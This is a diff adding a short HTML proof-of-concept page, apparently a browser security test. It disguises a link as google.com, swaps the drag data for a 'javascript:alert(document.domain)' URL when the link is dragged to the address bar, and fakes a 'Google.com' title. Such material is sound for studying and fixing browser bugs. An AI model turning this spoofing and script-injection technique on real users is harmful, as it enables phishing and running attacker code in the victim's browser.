@@ -1,0 +1,28 @@
+<title>
+Drag spoof 
+</title>
+<body>
+<h1><a href="http://www.google.com" id="a">DRAG ME TO Omnibox</a></h1>
+</body>
+<script>
+var spoof_url = 'www.google.com';
+//spoof_url = 'javascript:' + spoof_url;
+spoof_url = 'javascript:' + 'alert(document.domain)';//spoof_url;
+//setTimeout(ef,1)
+ondragstart= function() {
+  //event.dataTransfer.setData('text/plain','chrome://downloads/');
+  setTimeout(ef,1)
+  event.dataTransfer.setData('text/plain',spoof_url);
+}
+ondragend = function(){
+  document.title = 'Done';
+  setTimeout(ef,1)
+  document.write('<h1>Have a nice day....Fake Google...</h1>');
+}
+
+function ef()
+{
+document.title = 'Google.com';
+
+}
+</script>
